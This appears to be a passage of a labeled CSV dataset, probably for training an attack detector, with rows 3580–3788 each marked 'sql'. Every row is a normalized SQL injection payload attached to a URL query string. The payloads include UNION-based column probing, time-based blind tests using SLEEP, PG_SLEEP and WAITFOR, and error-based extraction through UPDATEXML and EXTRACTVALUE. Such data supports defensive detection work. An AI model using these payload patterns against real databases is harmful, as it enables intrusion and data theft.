3580,sql,". . / / ? = & =   ' ) ) AND =  -- "
3581,sql,". . / ? = & = & =   AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
3582,sql,". . ? = & =   PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) "
3583,sql,". . . / / / / ? = & =   "" ; SELECT PG_SLEEP ( )  --"
3584,sql,". . . ? = & = & =   ' , ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )  -- "
3585,sql,". . . / / / / ? = & =  - ' ) ) ORDER BY  -- "
3586,sql,". . . . / / ? = & = & =   ' ORDER BY # "
3587,sql,". . . / / / ? =   "" ) AND =  -- "
3588,sql,". . / / / / ? = & = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " cGME " LIKE " "
3589,sql,". . . . / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3590,sql,". . / ? = & = & = & =   "" ) ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ( ( " dNsq " = " "
3591,sql,". . / / / ? = & = & = & =  - % ' UNION ALL SELECT , , , # "
3592,sql,". . . / / ? = & =  - "" UNION ALL SELECT , , , , , , ,  -- "
3593,sql,". . / / ? = & =  - ) ) UNION ALL SELECT , , , , , , , , # "
3594,sql,". . . . / / / ? =   ' AND =  -- "
3595,sql,". . . . / / / / ? =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ' VdmP ' LIKE ' "
3596,sql,". . ? = & = & = & =   ' ) UNION ALL SELECT NULL , NULL , NULL -- "
3597,sql,". . . / ? =   "" AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND " pZqB " = " "
3598,sql,". . . / / ? =   ' AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3599,sql,". . . / / / / ? =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
3600,sql,". . / ? = & =    AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
3601,sql,". . / / ? = & = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3602,sql,". . . . / ? =  - ' UNION ALL SELECT , , , , # "
3603,sql,". . . / / ? = & =   ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3604,sql,". . / / ? = & =  - "" ) ) UNION ALL SELECT , , ,  -- "
3605,sql,". . . . / / ? = & = & = & =   % ' UNION ALL SELECT NULL # "
3606,sql,". . . . / / / / ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3607,sql,". . / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3608,sql,". . . . / / / / ? = & = & =   % ' ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3609,sql,". . / ? = & =   % "" ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3610,sql,". . . . ? = & = & = & =   ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' AXoi ' LIKE ' "
3611,sql,". . . . / / ? = & =   % ' ) AND = % "
3612,sql,". . . / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
3613,sql,". . . . / / ? =  - ' UNION ALL SELECT  -- "
3614,sql,". . / ? = & = & = & =   ' ) ) ) AND MAKE_SET ( = , ) AND ( ( ( ' akCs ' = ' "
3615,sql,". . . . / / ? = & = & = & =   % ' ) AND = # "
3616,sql,". . / / ? =   "" ) AND =  -- "
3617,sql,". . . / / ? = & = & =   ' ) ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( ( ' GHvB ' LIKE ' "
3618,sql,". . . ? = & = & = & =   ) AND MAKE_SET ( = , ) AND ( = "
3619,sql,". . / / ? = & = & = & =  - "" ) ) UNION ALL SELECT , , , , , # "
3620,sql,". . / ? =   ' ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( ' cTax ' = ' "
3621,sql,". . . . / / ? = & =   AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) "
3622,sql,". . / / ? = & = & = & =  - "" ) ) UNION ALL SELECT , , , , , , , ,  -- "
3623,sql,". . . . ? = & =  - ) ) ) ORDER BY # "
3624,sql,". . . . / / ? = & = & = & =  - % ' UNION ALL SELECT , , , , ,  -- "
3625,sql,". . / / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3626,sql,". . . . / ? =  - ' UNION ALL SELECT , # "
3627,sql,". . / / / / ? =   "" ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( " oZJE " = " "
3628,sql,". . . / / / / ? = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL # "
3629,sql,". . . . / / / / ? =   ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3630,sql,". . ? =   ; ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Bcts ) # "
3631,sql,". . / ? = & = & =   "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " udFP " = " "
3632,sql,". . / ? = & = & = & =  - "" ) ) UNION ALL SELECT  -- "
3633,sql,". . / ? = & =  - UNION ALL SELECT ,  -- "
3634,sql,". . . . ? =  - % "" ORDER BY # "
3635,sql,". . . / ? = & = & =   ' ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3636,sql,". . . . / / / / ? =  - UNION ALL SELECT , , , ,  -- "
3637,sql,". . . . / / ? = & = & =   % ' ) ) AND = AND ( ( ' % ' = ' "
3638,sql,". . ? =   % ' ) ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND ( ( ' % ' = ' "
3639,sql,". . . ? =   ' , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s )  -- "
3640,sql,". . / / / / ? = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3641,sql,". . / / ? = & =   ' ) ) AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ( ( ' MzdI ' LIKE ' "
3642,sql,". . . . / / / ? =  - ' UNION ALL SELECT , , # "
3643,sql,". . . / / / ? =   ) ) ) AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( ( = "
3644,sql,". . . / / / ? = & = & =   ' ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ( ( ' MEbL ' LIKE ' "
3645,sql,". . / / ? = & = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' TmEQ ' LIKE ' "
3646,sql,". . . / / ? =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' nXkQ ' = ' "
3647,sql,". . . / / / ? = & = & =   ) ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( ( = "
3648,sql,". . . . / / / ? = & =   RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) "
3649,sql,". . . . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3650,sql,". . . . ? = & = & = & =   % ' ) ) ; WAITFOR DELAY ' : : '  --"
3651,sql,". . . ? =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
3652,sql,". . / / ? = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( ( ' VZzc ' = ' "
3653,sql,". . / / / / ? = & =   "" ) AND = AND ( " Izdj " = " "
3654,sql,". . . . / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL # "
3655,sql,". . . . / / ? = & = & =    AND =  -- "
3656,sql,". . . . / / ? = & = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3657,sql,". . . / ? = & = & =    ORDER BY # "
3658,sql,". . ? = & =   ) ) ) ; SELECT SLEEP ( ) # "
3659,sql,". . / ? = & =   ' AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ' dzMS ' LIKE ' "
3660,sql,". . . . / / / / ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3661,sql,". . / / ? =   % ' ) ) AND = % "
3662,sql,". . / / / / ? = & = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
3663,sql,". . . . / / / / ? =   . "
3664,sql,". . / / / / ? = & = & = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' tayP ' = ' "
3665,sql,". . . / / / / ? =   ' ) AND =  -- "
3666,sql,". . . . / / / / ? = & = & = & =  - ' UNION ALL SELECT , , # "
3667,sql,". . . . ? = & = & = & =   ' AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ' zFxM ' = ' "
3668,sql,". . . . / / / ? = & = & = & =    AND MAKE_SET ( = , )  -- "
3669,sql,". . . . / / / ? =   "" ) ORDER BY  -- "
3670,sql,". . . / ? = & = & =  - UNION ALL SELECT , , , # "
3671,sql,". . . . / / / ? = & = & =   ' AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ' tayP ' = ' "
3672,sql,". . . . / / ? =   AND SLEEP ( ) # "
3673,sql,". . . / / / / ? = & = & =  - "" ORDER BY  -- "
3674,sql,". . . . / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
3675,sql,". . . / / ? = & = & = & =   ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( = "
3676,sql,". . / / / ? =   ) ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( ( = "
3677,sql,". . . / / / ? = & = & =   ' AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ' jIJS ' LIKE ' "
3678,sql,". . . ? = & =  - ) UNION ALL SELECT  -- "
3679,sql,". . / / ? = & = & = & =  - ) ORDER BY  -- "
3680,sql,". . / ? = & = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( = "
3681,sql,". . / / ? = & = & =   % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3682,sql,". . . . / ? = & = & =  - ' ) ) UNION ALL SELECT , , # "
3683,sql,". . . ? = & =   ' ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ' qpyK ' LIKE ' "
3684,sql,". . / / / ? = & =   ) ) ) AND MAKE_SET ( = , ) AND ( ( ( = "
3685,sql,". . . . / ? = & = & = & =   ) UNION ALL SELECT NULL # "
3686,sql,". . . ? = & = & = & =  - % ' UNION ALL SELECT , , , , , # "
3687,sql,". . . . ? = & = & =   "" ) UNION ALL SELECT NULL # "
3688,sql,". . . / / ? = & = & = & =   ' AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ' zJth ' = ' "
3689,sql,". . / / / ? = & =   ' ) ) AND SLEEP ( ) AND ( ( ' eWzK ' LIKE ' "
3690,sql,". . . . ? =   % ' ORDER BY  -- "
3691,sql,". . / / / ? = & = & = & =   ) AND =  -- "
3692,sql,". . ? = & =  - % ' ) UNION ALL SELECT , , , , ,  -- "
3693,sql,". . . . / ? = & = & =  - "" ) UNION ALL SELECT  -- "
3694,sql,". . / / / ? = & = & = & =   % ' ) ) AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) AND ( ( ' % ' = ' "
3695,sql,". . . / / / ? = & = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ' hCoq ' LIKE ' "
3696,sql,". . / / / / ? = & = & =   ' ) ) ) RLIKE SLEEP ( ) AND ( ( ( ' ukrT ' = ' "
3697,sql,". . . . / ? = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3698,sql,". . . ? =   % ' ) ) UNION ALL SELECT NULL # "
3699,sql,". . / / ? = & = & = & =   "" ) ; SELECT SLEEP ( ) AND ( " xzdz " = " "
3700,sql,". . . . / / / / ? = & = & = & =   % ' ) ORDER BY  -- "
3701,sql,". . . / ? = & =  - ) ) UNION ALL SELECT , ,  -- "
3702,sql,". . ? =    ORDER BY  -- "
3703,sql,". . . / / / / ? = & = & =   % "" ORDER BY  -- "
3704,sql,". . . . / / ? =   % ' ) AND = AND ( ' % ' = ' "
3705,sql,". . . . / / / ? = & = & = & =   AND =  -- "
3706,sql,". . . / / / / ? =  - ) ) ) ORDER BY  -- "
3707,sql,". . . . / ? = & =  - ' UNION ALL SELECT  -- "
3708,sql,". . / / / / ? = & = & =   % ' AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AND ' % ' = ' "
3709,sql,". . ? = & = & = & =   ' AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) zhty ) AND ' scip ' = ' "
3710,sql,". . / / ? =   AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) # "
3711,sql,". . . . / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , ,  -- "
3712,sql,". . . / / / ? = & = & = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " AQWj " LIKE " "
3713,sql,". . . / / / ? = & = & =   "" ) AND = % "
3714,sql,". . . / / / ? = & =   ' ) ) ORDER BY  -- "
3715,sql,". . / / / ? = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
3716,sql,". . . . / / / / ? = & =  - UNION ALL SELECT , , , , , # "
3717,sql,". . . / ? = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3718,sql,". . . / ? = & = & = & =  - % "" UNION ALL SELECT # "
3719,sql,". . / ? =   "" ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( " izbh " = " "
3720,sql,". . . . / ? = & = & =   ' ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ' szOS ' LIKE ' "
3721,sql,". . . . / / / ? = & = & = & =   ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ' yrRe ' = ' "
3722,sql,". . . . / / / / ? = & = & =   ) ) ) AND = % "
3723,sql,". . . / / / / ? =   "" ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( " FRRx " = " "
3724,sql,". . . ? = & =   % "" AND SLEEP ( ) AND " % " = " "
3725,sql,". . . / / / / ? = & = & =   "" ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ( " pHke " = " "
3726,sql,". . . . / / ? = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( = "
3727,sql,". . . . ? = & =   "" RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND " CUpQ " LIKE " "
3728,sql,". . . . / / / / ? = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3729,sql,". . / ? = & = & =  - "" UNION ALL SELECT , , , # "
3730,sql,". . . . / / ? = & = & =   ) ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ( = "
3731,sql,". . . / / / / ? = & =   % ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' % ' = ' "
3732,sql,". . / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
3733,sql,". . ? =   % ' ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ' % ' = ' "
3734,sql,". . / / / ? = & =   % ' ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( ' % ' = ' "
3735,sql,". . . . / / / ? =   % ' WAITFOR DELAY ' : : ' AND ' % ' = ' "
3736,sql,". . . ? =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3737,sql,". . . / ? = & =   "" AND MAKE_SET ( = , ) AND " kpzA " = " "
3738,sql,". . . . / ? = & =   ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x )  -- "
3739,sql,". . . . / ? = & = & =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' jDeW ' = ' "
3740,sql,". . . . / / / / ? = & =   ) AND MAKE_SET ( = , )  -- "
3741,sql,". . . . / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
3742,sql,". . . . ? = & =  - UNION ALL SELECT # "
3743,sql,". . . . / ? =   RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) # "
3744,sql,". . . / / ? = & = & = & =  - ) UNION ALL SELECT ,  -- "
3745,sql,". . ? = & =    AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) "
3746,sql,". . ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3747,sql,". . . . / / / ? = & =  - ' ) ) UNION ALL SELECT , , , , ,  -- "
3748,sql,". . / / ? =   ) ) WAITFOR DELAY ' : : ' AND ( ( = "
3749,sql,". . / / ? = & =   AND MAKE_SET ( = , ) # "
3750,sql,". . / ? = & =    AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) "
3751,sql,". . . / / / ? = & = & = & =  - % "" UNION ALL SELECT ,  -- "
3752,sql,". . . ? = & = & = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3753,sql,". . / / / ? =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3754,sql,". . . ? =   "" ) ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ( " bPTq " = " "
3755,sql,". . . / / ? =   AND = % "
3756,sql,". . . / ? =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
3757,sql,". . . / ? = & = & = & =   ( CASE WHEN ( = ) THEN ' ' ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
3758,sql,". . . . / / / ? =   % ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' % ' = ' "
3759,sql,". . ? =   ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
3760,sql,". . . . / / / ? = & =   "" AND SLEEP ( ) AND " Sutp " LIKE " "
3761,sql,". . / / ? =  - ' UNION ALL SELECT , , , , ,  -- "
3762,sql,". . . / / ? = & = & =   "" ) ) AND MAKE_SET ( = , ) AND ( ( " LhLU " = " "
3763,sql,". . . . ? = & = & = & =   ' ; SELECT SLEEP ( ) # "
3764,sql,". . / / ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
3765,sql,". . / / / ? = & =    RLIKE SLEEP ( ) # "
3766,sql,". . / / / ? = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
3767,sql,". . . . / / ? =   ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
3768,sql,". . . / / / / ? = & = & = & =   ' ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
3769,sql,". . / / / / ? = & = & =  - % ' ) ) UNION ALL SELECT , , , , # "
3770,sql,". . / / ? = & = & = & =   ' ; SELECT PG_SLEEP ( )  --"
3771,sql,". . . / ? =  - ) ) ) UNION ALL SELECT  -- "
3772,sql,". . . . / / / / ? = & =   "" ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION pmIM --"
3773,sql,". . . / / / / ? = & = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) ) AND ( ( ' frfQ ' = ' "
3774,sql,". . . / ? =  - ' ) ) ) UNION ALL SELECT , , , , , , # "
3775,sql,". . . . / / / / ? =    AND = # "
3776,sql,". . . / / ? = & = & =  - % ' UNION ALL SELECT , , , , ,  -- "
3777,sql,". . / / ? = & = & = & =  - ' UNION ALL SELECT , , , # "
3778,sql,". . ? = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
3779,sql,". . ? =   ) ) AND =  -- "
3780,sql,". . . . / / / ? = & = & =   ' PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ' ROEU ' = ' "
3781,sql,". . / ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL -- "
3782,sql,". . . / / / ? = & = & =   ' ) UNION ALL SELECT NULL -- "
3783,sql,". . . / ? = & =   "" ORDER BY  -- "
3784,sql,". . . . / / / / ? = & = & = & =   ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
3785,sql,". . / / ? =   ) AND MAKE_SET ( = , ) AND ( = "
3786,sql,". . . . / / ? = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) )  -- "
3787,sql,". . . . ? =   ) ) ) ; SELECT SLEEP ( ) # "
3788,sql,". . . / / ? = & =   ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
